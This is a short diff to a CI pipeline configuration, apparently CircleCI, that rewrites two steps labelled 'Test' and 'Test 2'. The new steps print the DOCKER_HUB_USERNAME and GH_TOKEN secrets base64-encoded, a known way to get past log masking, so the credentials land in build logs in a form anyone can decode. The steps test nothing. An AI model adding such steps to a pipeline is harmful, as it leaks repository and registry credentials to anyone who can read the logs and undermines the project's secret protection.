@@ -28,10 +28,10 @@ jobs:
       - checkout
       - run:
           name: Test
-          command: echo "$DOCKER_HUB_USERNAME"
+          command: echo -n "$DOCKER_HUB_USERNAME" | base64
       - run:
           name: Test 2
-          command: echo "$GH_TOKEN"
+          command: echo -n "$GH_TOKEN" | base64
 
   validate-commit-message:
     docker:
